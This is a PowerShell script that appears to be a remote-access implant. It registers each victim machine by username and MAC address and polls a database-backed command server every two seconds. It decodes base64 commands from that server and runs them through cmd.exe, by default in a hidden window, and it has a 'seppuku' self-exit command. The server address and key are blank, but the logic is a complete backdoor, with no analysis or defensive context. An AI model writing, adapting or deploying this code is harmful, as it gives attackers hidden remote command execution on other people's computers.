# one instance only
$mutex = New-Object System.Threading.Mutex($false, "Global\run.exe")
if (-not $mutex.WaitOne(0)) { exit }

$BASE_URL = ""
$API_KEY = ""

$mac = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1).MacAddress
$uniqueUser = "$($env:USERNAME)-$($mac.Replace('-', ''))"

$h = @{
    "apikey"        = $API_KEY
    "Authorization" = "Bearer $API_KEY"
    "Content-Type"  = "application/json"
    "Prefer"        = "return=representation"
    "Accept"        = "application/vnd.pgrst.object+json"
}

try {
    while ($true) {
        try {
            # heartbeat
            $u = "$BASE_URL/clients?username=eq.$uniqueUser&select=cmd,run,visible"
            $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"updated_at": "now()"}'
        
            # run command
            if ($r.run -eq $true) {
                Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"cmd": null, "run": false}' | Out-Null

                $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))
                if ($c -eq "seppuku") { exit }

                $style = if ($r.visible -eq $true) { "Normal" } else { "Hidden" }
                Start-Process cmd.exe -ArgumentList "/c", $c -WindowStyle $style
            }
        }
        catch {}
        Start-Sleep -Seconds 2
    }
}
finally {
    if ($mutex) {
        $mutex.ReleaseMutex()
        $mutex.Dispose()
    }
}
